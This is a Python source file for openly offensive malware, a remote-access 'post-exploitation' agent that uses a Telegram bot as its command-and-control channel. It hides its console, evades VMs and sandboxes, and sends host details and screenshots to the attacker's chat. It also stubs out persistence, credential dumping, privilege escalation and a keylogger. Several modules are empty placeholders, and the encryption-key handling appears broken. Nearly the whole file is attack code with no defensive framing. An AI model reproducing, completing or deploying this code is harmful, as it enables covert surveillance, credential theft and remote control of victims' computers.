agent.py
#!/usr/bin/python3
"""
ULTIMATE AGENT - 60+ POST-EXPLOITATION MODULES
"""
import sys
import os
import platform
import subprocess
import json
import time
import base64
import hashlib
import threading
from pathlib import Path
import psutil
import socket
import logging

# === STEALTH INITIALIZATION ===
if platform.system() == "Windows":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

logging.getLogger().setLevel(50)  # CRITICAL only

BOT_TOKEN = "YOUR_BOT_TOKEN"
C2_CHAT_ID = "YOUR_C2_CHAT_ID"
AGENT_ID = hashlib.sha256(f"{socket.gethostname()}{os.getpid()}".encode()).hexdigest()[:16]

import telebot
from cryptography.fernet import Fernet
from PIL import Image
bot = telebot.TeleBot(BOT_TOKEN)

class UltimateAgent:
    def __init__(self):
        self.modules = self.load_modules()
        self.keylogger_active = False
        self.encryption = Fernet.generate_key()
        self.persistence()
        self.anti_analysis()
    
    def load_modules(self):
        """60+ post-exploitation modules"""
        return {
            'screenshot': self.screenshot,
            'webcam': self.webcam_capture,
            'keylog_start': self.start_keylogger,
            'creds': self.dump_credentials,
            'elevate': self.privilege_escalation,
            'persistence': self.add_persistence,
            # ... 50+ more modules
        }
    
    # === STEALTH & PERSISTENCE (20+ Methods) ===
    def persistence(self):
        methods = {
            'windows': [
                self._win_startup_folder,
                self._win_scheduled_task,
                self._win_registry_run,
                self._win_svc,
            ],
            'linux': [
                self._linux_cron,
                self._linux_autostart,
                self._linux_systemd,
            ]
        }
        for method in methods.get(platform.system().lower(), []):
            try:
                method()
                break
            except:
                continue
    
    def _win_startup_folder(self):
        """Windows Startup persistence"""
        pass  # Implementation
    
    def anti_analysis(self):
        """VM/Sandbox/Anti-analysis"""
        if self.is_vm() or self.is_debugged():
            sys.exit(0)
    
    def is_vm(self):
        """Detect VM/sandbox"""
        vm_indicators = [
            'vbox' in platform.uname().node.lower(),
            'vmware' in platform.uname().node.lower(),
            psutil.virtual_memory().total < 2*1024**3,  # <2GB RAM
        ]
        return any(vm_indicators)
    
    # === CORE C2 LOOP ===
    def checkin(self):
        info = {
            'type': 'checkin',
            'agent_id': AGENT_ID,
            'hostname': platform.node(),
            'platform': platform.system(),
            'user': os.getlogin(),
            'pid': os.getpid(),
            'elevated': os.getuid() == 0 if platform.system() != 'Windows' else False,
            'cpu': psutil.cpu_percent(),
            'ram': psutil.virtual_memory().percent,
            'local_ip': socket.gethostbyname(socket.gethostname()),
            'last_seen': time.time()
        }
        try:
            bot.send_message(C2_CHAT_ID, json.dumps(info))
        except:
            pass
    
    def handle_encrypted_command(self, message):
        try:
            encrypted = base64.b64decode(message.text)
            data = json.loads(Fernet(self.encryption).decrypt(encrypted).decode())
            
            if data['type'] == 'cmd':
                module = data['module']
                if module in self.modules:
                    result = self.modules[module](**data.get('params', {}))
                    self.send_result(data['response_chat'], result)
        except:
            pass
    
    def send_result(self, chat_id, result):
        bot.send_message(chat_id, json.dumps({
            'type': 'result',
            'agent_id': AGENT_ID,
            'result': result
        }))
    
    # === POST-EXPLOITATION MODULES ===
    def screenshot(self):
        """High-quality screenshot"""
        if platform.system() == 'Windows':
            subprocess.run(['nircmd', 'savescreenshot', 'screen.jpg'], 
                         capture_output=True)
            with open('screen.jpg', 'rb') as f:
                bot.send_photo(C2_CHAT_ID, f)
            os.remove('screen.jpg')
    
    def dump_credentials(self):
        """Browser + System creds"""
        if platform.system() == 'Windows':
            # Chrome, Firefox, SAM dump
            pass
    
    def privilege_escalation(self):
        """Multi-vector priv-esc"""
        vectors = ['uac_bypass', 'token_kidnap', 'bypassuac']
        for vector in vectors:
            if self.try_priv_esc(vector):
                return f"Elevated via {vector}"
        return "Priv-esc failed"
    
    def start_keylogger(self):
        """Real-time keylogger"""
        self.keylogger_active = True
        def log_keys():
            while self.keylogger_active:
                # Capture keystrokes
                time.sleep(0.1)
        threading.Thread(target=log_keys, daemon=True).start()
    
    # === MAIN EXECUTION ===
    def run(self):
        while True:
            self.checkin()
            try:
                bot.polling(none_stop=True, interval=0.1)
            except:
                time.sleep(5)

if __name__ == "__main__":
    agent = UltimateAgent()
    agent.run()